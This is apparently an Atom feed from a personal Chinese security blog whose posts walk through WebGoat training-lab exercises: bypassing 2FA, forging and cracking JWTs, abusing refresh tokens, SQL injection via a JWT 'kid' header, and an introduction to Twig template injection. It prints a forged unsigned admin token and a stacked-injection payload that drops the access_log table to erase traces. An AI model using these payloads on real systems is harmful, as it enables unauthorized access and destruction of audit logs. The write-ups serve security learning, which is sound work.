<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2023-11-21T03:11:03.677Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WebGoat-Authentication_Bypasses_1</title>
    <link href="https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/"/>
    <id>https://taninluv.github.io/2023/11/19/WebGoat-Authentication-Bypasses/</id>
    <published>2023-11-19T01:56:25.000Z</published>
    <updated>2023-11-21T03:11:03.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2FA"><a href="#2FA" class="headerlink" title="2FA"></a>2FA</h1><p>这道题他先给了一个例子，<a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass</a></p><p>是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。</p><span id="more"></span><p>照着这个思路做他给的这道题，直接删除字段好像不行，我们先审计一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191024345.png" alt="image-20231119102436245"></p><p>可以看到，想要返回success，需要<code>verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)</code></p><p>返回False，然后<code>verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)</code>为True，跟进这两个函数看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191028892.png" alt="image-20231119102805345"></p><p>想要<code>didUserLikelylCheat</code>返回0，不能提交正确的答案，他这道题就是让我们必须绕过验证，他这里检查的作弊应该是直接用源码里的验证答案~到这里删除包里的答案字段应该是可以行得通的，继续往下看为什么不可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191115968.png" alt="image-20231119103208557"></p><p>想要<code>verifyAccount</code>返回1，对于map的size()方法是返回键值对的个数，这里他检测了输入的键值对数量是否和答案的键值对数量是否相同，因此不能直接删除包里的答案字段了，后面两个if是检测输入的值和答案相同，最终返回true。</p><p>目前看来，我们必须输入两个答案字段（两个键值对），并且必须携带错误的答案绕过作弊检测，输入正确的答案绕过身份验证，看起来好像很矛盾，但是如果我们的键没有他要检测的这两个键就可以直接绕过身份验证的if检测：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191118060.png" alt="image-20231119111849009"></p><p>但是似乎回显并不正确？看一看键值对怎么传进去的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191116440.png" alt="image-20231119111637385"></p><p>原来是需要包含secQuestion字段的键，但是str.contains()方法是检测子句是否包含，也就是说我们传入包含键名secQuestion字段的键就可以了，比如secQuestiona、secQuestionb：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119655.png" alt="image-20231119111925607"></p><p>通过辣：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119526.png" alt="image-20231119111939481"></p><h1 id="JWT-4"><a href="#JWT-4" class="headerlink" title="JWT-4"></a>JWT-4</h1><p>关于jwt不再赘述，这里先看题</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200947836.png" alt="image-20231120094744680"></p><p>这里让修改账户的jwt使之成为管理员用户，然后投票，先抓包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200949474.png" alt="image-20231120094958421"></p><p>与此同时，我们还看见了access_token&#x3D;””，很奇怪：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200957608.png" alt="image-20231120095737558"></p><p>看见了jwt，但是不知道如何判定身份，进入源码审计一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200959298.png" alt="image-20231120095943236"></p><p>这里大致看得出来是通过<code>admin</code>把作为身份判定的关键字，这里可以构造</p><pre><code>&quot;adimn&quot;:&quot;true&quot;</code></pre><p>isadmin因为是bool类型，直接传入True,发现验证还是没通过，找一下这个access_token:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110366.png" alt="image-20231120101425320"></p><p>先看到如果user的值包含在vaildUsers中，就会加入非admin的jwt，否则判定为未认证，再往下看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110368.png" alt="image-20231120101953066"></p><p>从这一段看accessToken不能为空，否则会被限制为guest，与此同时user值不能为Guset，也不是vaildUser的子段。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110369.png" alt="image-20231120102425875"></p><p>跟之前差不多，似乎只要不为空即可</p><p>但是又发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110370.png" alt="image-20231120103450762"></p><p>400了，看了一下路由，发现是提交到refresh的，到这段路由看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110371.png" alt="image-20231120104224931"></p><p>发现虽然没有解析admin，但也不至于报错，而且required &#x3D; false？仔细检查发现json不同键值对之间要用<code>,</code>间隔~</p><p>修改后发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110372.png" alt="image-20231120104401256"></p><p>这里应该生成token，这道题的入口应该不在这里，因为根据这段路由来看我们无法自建用户和密码通过验证，最终导致UNAUTHORIZED</p><p>其实目前看来，需要找传到这段路由的数据然后修改包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110374.png" alt="image-20231120104700675"></p><p>然后抓到了这个包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110375.png" alt="image-20231120104828334"></p><p>但是发现不行，突然发现有一个切换用户的地方，笑死，还是太急躁了，没有好好检查页面就开始乱审计，先点击切换用户登录，这时候就可以点击重置投票的按钮了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110376.png" alt="image-20231120152102403"></p><p>这里还是得用专门的网站，不然解码有乱码，修改后加密发送很可能出问题：<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110377.png" alt="image-20231120110120545"></p><p>这里有一个坑，题目是没有签名的，所以把header和payload贴过去就可以了，后面蓝色部分是网站初始化生成的，不是我们需要的，所以我的最终payload是：</p><pre><code>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDEzMjg0ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></pre><h1 id="JWT-5"><a href="#JWT-5" class="headerlink" title="JWT-5"></a>JWT-5</h1><p>这题是jwt破解，找个工具用rockyou.txt跑一下就可以了,要把exp时间戳修改到未过期的时间</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>他这里提到了一个无状态会话：</p><pre><code>&#123;    &quot;token_type&quot;:&quot;bearer&quot;,    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,    &quot;expires_in&quot;:10,    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125;</code></pre><p>原文：</p><blockquote><p>正如你所看到的，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存或数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以称之为“无状态”会话，服务器端就没有设置用户会话的负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保该令牌不会以任何方式被阻止。 每当攻击者持有访问令牌时，该令牌仅在一定时间内有效（例如10分钟）。然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。也可以使刷新令牌无状态，但这意味着查看用户是否吊销了令牌将变得更加困难。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新访问令牌。客户端可以使用新的访问令牌来进行API调用。</p></blockquote><p>看起来jwt只给了一个10分钟但是我们不知道是什么时候开始什么时候结束</p><p>原文：</p><blockquote><p>你应该检查什么？ </p><p>无论选择哪种解决方案，都应该在服务器端存储足够的信息，以验证用户是否仍然可信。你可以考虑很多事情，比如存储ip地址，跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口中多次使用刷新令牌可能表明有奇怪的行为，你可以撤销所有令牌，让用户再次进行身份验证）。还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会使用攻击者的刷新令牌为其他用户获取新的访问令牌（请参阅<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%E5%86%99%E4%B8%80%E7%AF%87%E5%85%B3%E4%BA%8E%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%90%E4%BD%9C%E7%9A%84%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%89%E6%AD%A4%E5%A4%96%EF%BC%8C%E6%A3%80%E6%9F%A5%E7%94%A8%E6%88%B7%E7%9A%84ip%E5%9C%B0%E5%9D%80%E6%88%96%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E4%B9%9F%E6%98%AF%E4%B8%80%E4%BB%B6%E5%A5%BD%E4%BA%8B%E3%80%82%E5%A6%82%E6%9E%9C%E6%82%A8%E9%9C%80%E8%A6%81%E5%8F%91%E6%94%BE%E6%96%B0%E7%9A%84%E4%BB%A4%E7%89%8C%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E4%BD%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E4%BB%8D%E7%84%B6%E7%9B%B8%E5%90%8C%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%92%A4%E9%94%80%E6%89%80%E6%9C%89%E4%BB%A4%E7%89%8C%E5%B9%B6%E8%AE%A9%E7%94%A8%E6%88%B7%E5%86%8D%E6%AC%A1%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%89%E3%80%82">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/写一篇关于这种攻击是如何运作的好文章）此外，检查用户的ip地址或地理位置也是一件好事。如果您需要发放新的令牌，请检查位置是否仍然相同（如果不撤销所有令牌并让用户再次进行身份验证）。</a></p></blockquote><ul><li>储存ip</li><li>跟踪刷新令牌次数</li><li>跟踪哪个访问令牌属于哪个刷新令牌</li></ul><p>原文：</p><blockquote><p>需要刷新令牌 在现代单页应用程序（SPA）中使用刷新令牌有意义吗？</p><p>正如我们在关于存储令牌的部分中所看到的，有两种选择：网络存储或cookie，这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌被泄露，刷新令牌也可能被泄露。当然，大多数时候都是有区别的。访问令牌是在您进行API调用时发送的，刷新令牌仅在应该获得新的访问令牌时发送，在大多数情况下，该访问令牌是不同的端点。如果您最终在同一台服务器上，您可以选择只使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些优势，使其不必反复检查访问令牌。仅当用户需要新的访问令牌时才执行检查。当然，只使用访问令牌是可能的。在服务器上，您存储的信息与为刷新令牌存储的信息完全相同，请参阅上一段。通过这种方式，您每次都需要检查令牌，但根据应用程序的不同，这可能是合适的。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 JWT是个好主意吗？ 有很多可用的资源对使用JWT令牌进行Cookie的客户端到服务器身份验证的用例提出了质疑。使用JWT令牌的最佳位置是服务器与服务器之间的通信。在普通的web应用程序中，您最好使用普通的旧cookie。有关详细信息，请参阅：</p><ul><li><a href="http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/">stop-using-jwt-for-sessions</a></li><li><a href="http://cryto.net/~joepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/">stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work</a></li></ul></blockquote><ul><li>访问令牌泄露和刷新令牌泄露大多数时候是有区别的</li><li>使用JWT令牌的最佳位置是服务器与服务器之间的通信</li></ul><p>可能翻译有点问题，后面或许会单独开一篇研究上面提到的文章链接</p><h1 id="jwt-7"><a href="#jwt-7" class="headerlink" title="jwt-7"></a>jwt-7</h1><p>这题先给了一个案例<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">here</a>，大概是刷新令牌没有和访问令牌或者用户绑定，我可以用自己的刷新令牌刷新别人的令牌，大概过程是</p><pre><code>&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</code></pre><p>这里收到了一个刷新令牌”refresh_token”:”ABC123”</p><p>然后发送</p><pre><code>POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</code></pre><p>最终收到了新的令牌</p><p>然后回到这道题：From a breach of last year the following logfile is available <a href="http://172.20.10.3:8080/WebGoat/images/logs.txt">here</a> Can you find a way to order the books but let <strong>Tom</strong> pay for them?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110378.png" alt="image-20231120163752336"></p><p>我们先点击链接看看日志里面有一个token，解密得到：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110379.png" alt="image-20231120164041633"></p><p>但是我们并没有得到刷新令牌之类的，还是审计一下源码。</p><p>有了之前的经验，这次直接找到提交的路由先进行审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110380.png" alt="image-20231120165855282"></p><p>总的来说，需要创建一个header为Authorization，然后把字符串<code>Bearer </code>(这里字符串后面有一个空格)替换为空，不知道是不是必要的（后来抓包发现是自带的），处理后的字符串进行了jwt解析，也就是说传入的数据是这样的（看了wp然后又审了一遍才反应过来的，又学到了hh）：</p><pre><code>Authorization:  Bearer &#123;JWT&#125; </code></pre><p>   然后要user值为Tom，至于alg是否置空似乎都可以success</p><p>再看看刷新token部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110381.png" alt="image-20231120170427057"></p><p>和上面重叠的比较多，这里需要user和refreshToken都不为空，refreshToken来自我们传入的请求体，是一个json，也就是jwt，同时他要存在于validRefreshTokens，追一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110382.png" alt="image-20231120170914764"></p><p>这里发现是20个随机字母，这里他或许会自己生成</p><p>当然这些只是顺带看一眼，我们按照之前log拿到的JWT，修改一下时间戳，发送试试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110383.png" alt="image-20231120172549432"></p><p>ok了</p><h1 id="jwt-8"><a href="#jwt-8" class="headerlink" title="jwt-8"></a>jwt-8</h1><p>这道题很奇怪，源码中找不到对应的路由，但是其对应的源码应该就是这一段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110384.png" alt="image-20231121095746850"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110385.png" alt="image-20231121100034949"></p><p>这里看起来有一个很明显的sql注入，大概逻辑是header中传入一个kid然后与数据库比对，返回查询结果 ；然后payload中的username为Tom即可success，尝试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110386.png" alt="image-20231121102201508"></p><p>发现返回“Not a valid JWT token”，再审审：</p><p>这里存在一个jwt解析器，之前没看明白：</p><p><a href="https://www.jianshu.com/p/6bfeb86885a3">JJWT使用笔记（二）—— JWT token的解析 - 简书 (jianshu.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110387.png" alt="image-20231121103952935"></p><p>这个解析器可以发现我的jwt没签名，因此返回错误，但是我怎么知道签名呢？看</p><p>这个setSigningKeyResolver</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110388.png" alt="image-20231121104250134"></p><p>他这里跟示例不一样，使用了一个获取器里包含箭头函数，应该是特定用法，用于动态获取SigningKey，暂不深究语法。然后是sql查询根据kid找到对应的SigningKey，并进行了base64解码，为什么要解码呢？因为查询出来的SigningKey应该是base64加密的，此时我们让kid查询返回为空，然后union插入一段base64加密后的字段（SigningKey），那么我们就可以控制SigningKey了</p><pre><code>water3 =&gt; d2F0ZXIz</code></pre><p>这里有个小坑：</p><p>看着时post发包下意识使用<code>#</code>注释，但是这里可能上下文不支持服务器会出错，需要使用<code>--</code>来注释：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110389.png" alt="image-20231121110851500"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110390.png" alt="image-20231121110909467"></p><p>ok了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2FA&quot;&gt;&lt;a href=&quot;#2FA&quot; class=&quot;headerlink&quot; title=&quot;2FA&quot;&gt;&lt;/a&gt;2FA&lt;/h1&gt;&lt;p&gt;这道题他先给了一个例子，&lt;a href=&quot;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&quot;&gt;https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。&lt;/p&gt;</summary>
    
    
    
    
    <category term="WebGaot" scheme="https://taninluv.github.io/tags/WebGaot/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="2FA" scheme="https://taninluv.github.io/tags/2FA/"/>
    
    <category term="jwt" scheme="https://taninluv.github.io/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Sql</title>
    <link href="https://taninluv.github.io/2023/11/18/WebGoat-Sql/"/>
    <id>https://taninluv.github.io/2023/11/18/WebGoat-Sql/</id>
    <published>2023-11-18T07:12:02.000Z</published>
    <updated>2023-11-18T08:25:00.967Z</updated>
    
    <content type="html"><![CDATA[<p>学习webgoat靶场的时候遇到一个有意思的sql注入</p><p>在这之前值得一提的是，sql的所有操作都会记录到<strong>access_log</strong>这个表中，如果可以堆叠注入，最后记得要清除这个表：</p><pre><code>1&#39;;drop table access_log; -- -</code></pre><p>然后是一道sql：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181522955.png" alt="image-20231118152250268"></p><p>首先探测一下注入点</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181611314.png" alt="img"></p><p>这里是实际是成功执行了查询，显示没有结果，所以没有注入点，否则应该会报错</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181526454.png" alt="image-20231118152647292"></p><p>这里比较扯，他说这个名字存在，但其实应该是注入生效返回了True</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181528156.png" alt="image-20231118152823527"></p><p>对密码进行测试的时候直接创建了，然而我两次输入的密码明明是不一样的，这里把握搞晕了。后来查看了一下博客发现我跑偏题了，username这里能进行注入，那么通过这个地方要么查询要么修改Tom的密码然后登陆</p><p>然后到了bool盲注的阶段，这里不再赘述了，只是个人经验不是很足，对这个回显麻痹了一下，觉得挺有意思的。</p><h2 id="然后是一些防御："><a href="#然后是一些防御：" class="headerlink" title="然后是一些防御："></a>然后是一些防御：</h2><h3 id="静态查询"><a href="#静态查询" class="headerlink" title="静态查询"></a>静态查询</h3><pre><code>SELECT * FROM users WHERE user = &quot;&#39;&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;&#39;&quot;;</code></pre><p>这里专门查询了一下：</p><pre><code>- 静态 SQL：静态 SQL 语句一般用于嵌入式 SQL 应用中，在程序运行前，SQL 语句必须是确定的，例如 SQL 语句中涉及的列名和表名必须是存在的。静态 SQL 语句的编译是在应用程序运行前进行的，编译的结果会存储在数据库内部。而后程序运行时，数据库将直接执行编译好的 SQL 语句，降低运行时的开销。静态SQL在编译时已经确定了引用的表和列。 宿主变量不改变表和列信息。 可以使用主变量改变查询参数值， 但是不能用主变量代替表名或列名。- 动态 SQL：动态 SQL 语句是在应用程序运行时被编译和执行的，不在编译时确定 SQL 的表和列，而是让程序在运行时提供，并将SQL 语句文本传给 DBMS 执行。 静态 SQL 语句在编译时已经生成执行计划。 而动态 SQL 语句，只有在执行时才产生执行计划。动态 SQL 语句首先执行 PREPARE 语句要求 DBMS 分析、确认和优化语句，并为其生成执行计划。例如，使用 DB2 的交互式工具 CLP 访问数据库时，用户输入的 SQL 语句是不确定的，因此 SQL 语句只能被动态地编译。动态 SQL 的应用较多，常见的 CLI 和 JDBC 应用程序都使用动态 SQL。</code></pre><p>所以这里的静态语句是直接确定的，在程序运行以前就编译好了，用户无法自主控制</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>这个就不说了，预编译虽然是一个非常有效的的sql注入防御方法，但是听D4n师傅说有些语句和sql的特性注定了会被注入，然后简单查询了一下：</p><p>[SQL预编译的绕过_sql注入绕过预编译-CSDN博客](<a href="https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E7%BB%95%E8%BF%87">https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL预编译的绕过</a> 1 字符串拼接：如果在SQL预编译语句中使用了字符串拼接，攻击者可以通过构造特定的字符串来绕过预编译过程。 2,动态拼接SQL语句：如果动态地拼接SQL语句，例如使用字符串拼接、字符串格式化等方式，攻击者同样可以利用字符串的特性来绕过预编译过程。 3 SQL语句中使用函数或存储过程：如果在SQL语句中使用了函数或存储过程，攻击者可以构造恶意的输入，使其执行预期之外的操作，绕过预编译过程。 4 错误处理不当：如果SQL预编译过程中的错误处理不当，例如忽略异常或者异常处理不当，攻击者可能会通过特定的输入来触发错误，绕过预编译过程。)</p><p>显然虽然可以绕过，但是明显已经有了很强的局限性</p><h3 id="最后是转义字符，即过滤掉一些特殊字符，以及WAF"><a href="#最后是转义字符，即过滤掉一些特殊字符，以及WAF" class="headerlink" title="最后是转义字符，即过滤掉一些特殊字符，以及WAF"></a>最后是转义字符，即过滤掉一些特殊字符，以及WAF</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习webgoat靶场的时候遇到一个有意思的sql注入&lt;/p&gt;
&lt;p&gt;在这之前值得一提的是，sql的所有操作都会记录到&lt;strong&gt;access_log&lt;/strong&gt;这个表中，如果可以堆叠注入，最后记得要清除这个表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&amp;#39;;dro</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
  </entry>
  
  <entry>
    <title>关于SSTI的简单研究</title>
    <link href="https://taninluv.github.io/2023/11/13/SSTI/"/>
    <id>https://taninluv.github.io/2023/11/13/SSTI/</id>
    <published>2023-11-13T12:24:54.000Z</published>
    <updated>2023-11-15T00:40:54.128Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/#gallery">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>大纲参考：</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>这里只是了解一下模板的大致原理，不对如何构造payload过多强求</p><p>对于绕过黑名单的一些方法等后续遇到一个学一个，这里也不过多耗费精力，因为根本记不住hh</p><h1 id="PHP-ssti"><a href="#PHP-ssti" class="headerlink" title="PHP ssti"></a>PHP ssti</h1><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p><a href="https://www.runoob.com/w3cnote/composer-install-and-usage.html">Composer 安装与使用 | 菜鸟教程 (runoob.com)</a></p><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arrow_functions">箭头函数 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://zhuanlan.zhihu.com/p/366240343">搞明白JavaScript中的匿名函数 - 知乎 (zhihu.com)</a></p><p><a href="https://juejin.cn/post/7041055543984652319">这一次，彻底搞懂箭头函数 - 掘金 (juejin.cn)</a></p><p>箭头函数表达式的语法比<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>更简洁，并且没有自己的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this"><code>this</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>或<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new.target"><code>new.target</code></a>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p><h2 id="Twig-基础"><a href="#Twig-基础" class="headerlink" title="Twig 基础"></a>Twig 基础</h2><p><a href="https://geek-docs.com/php/php-tutorial/php-twig.html#ftoc-heading-1">PHP Twig 教程|极客教程 (geek-docs.com)</a></p><p><a href="https://www.osgeo.cn/twig/filters/map.html">map — Twig 文档 (osgeo.cn)</a></p><p>先按照教程尝试简单的例子来了解Twig如何运作：</p><p>first.php：</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);echo $twig-&gt;render(&#39;first.html.twig&#39;, [&#39;name&#39; =&gt; &#39;John Doe&#39;,     &#39;occupation&#39; =&gt; &#39;gardener&#39;]);</code></pre><p>这里使用<code>FilesystemLoader</code>从指定目录加载模板</p><p>输出通过<code>render()</code>生成。 它带有两个参数：模板文件和数据。</p><p>这里再补充一下render()，大概就是渲染加载的意思：</p><p><a href="https://juejin.cn/post/7030362678199582734">Vue中 渲染函数（render）的介绍和应用 - 掘金 (juejin.cn)</a></p><p>templates&#x2F;first.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;        &#123;&#123; name &#125;&#125; is a &#123;&#123; occupation &#125;&#125;    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>变量以<code>&#123;&#123;&#125;&#125;</code>语法输出。</p><p>filters.php</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;, &#39;rock&#39;, &#39;blue&#39;];$sentence = &#39;today is a windy day&#39;;echo $twig-&gt;render(&#39;filter.html.twig&#39;,     [&#39;words&#39; =&gt; $words, &#39;sentence&#39; =&gt;$sentence]);</code></pre><p>templates&#x2F;filters.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Filters&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;     The array has &#123;&#123; words | length &#125;&#125; elements    &lt;/p&gt;    &lt;p&gt;     Joined array elements: &#123;&#123; words | join(',') &#125;&#125;     &lt;/p&gt;        &lt;p&gt;     &#123;&#123; sentence | title &#125;&#125;     &lt;/p&gt;        &lt;/body&gt;&lt;/html&gt;</code></pre><p>if 、for等内容不再赘述，看看set标签：</p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a><code>set</code>标签</h3><p>允许将值设置为模板内的变量。</p><pre><code class="php">$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;,    &#39;rock&#39;, &#39;blue&#39;, &#39;solid&#39;, &#39;book&#39;, &#39;tree&#39;];echo $twig-&gt;render(&#39;test.html.twig&#39;, [&#39;words&#39; =&gt; $words]);</code></pre><pre><code class="php">&#123;% set sorted = words | sort %&#125;&lt;ul&gt;&#123;% for word in sorted %&#125;    <li>&#123;&#123; word &#125;&#125;</li>&#123;% endfor %&#125;&lt;/ul&gt;</code></pre><h3 id="verbatim标签"><a href="#verbatim标签" class="headerlink" title="verbatim标签"></a>verbatim标签</h3><p><code>verbatim</code>将部分标记为不应该分析的原始文本。</p><pre><code class="php">&#123;% verbatim %&#125;    <ul>    &#123;% for word in words %&#125;        <li>&#123;&#123; word &#125;&#125;</li>    &#123;% endfor %&#125;    </ul>&#123;% endverbatim %&#125;</code></pre><h3 id="Twig-自动转义"><a 